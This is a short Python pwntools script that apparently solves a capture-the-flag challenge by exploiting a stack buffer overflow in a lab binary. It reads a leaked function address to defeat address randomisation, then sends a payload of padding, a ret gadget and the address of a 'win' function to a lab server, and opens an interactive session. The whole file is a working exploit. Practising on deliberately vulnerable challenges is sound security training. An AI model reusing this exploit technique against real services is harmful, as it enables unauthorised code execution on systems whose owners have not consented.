import pwn
from pwn import context, remote, process, p32, p64, asm, shellcraft, ROP

# checksec --file materials-TryPwnMeOne/TryOverFlowMe1/overflowme1 
# Arch:       amd64-64-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

context.binary = binary = pwn.ELF('materials-TryPwnMeOne/RandomMemories/random', checksec=False)

payload = b''

#p = process()
p = remote("10.10.77.133", 9007)

p.recvuntil(b"I can give you a secret ")
vuln_address = int(p.recvline().rstrip().decode(), 16)
base_address = vuln_address - binary.symbols["vuln"]

binary.address = base_address

win_address = binary.symbols["win"]

rop = ROP(binary)
ret = rop.find_gadget(["ret"])[0]

# 265 array + 8 bytes RBP
payload = (b'A' * 264)
# insert ret
payload += p64(ret)
payload += p64(win_address)

p.sendline(payload)
p.interactive()
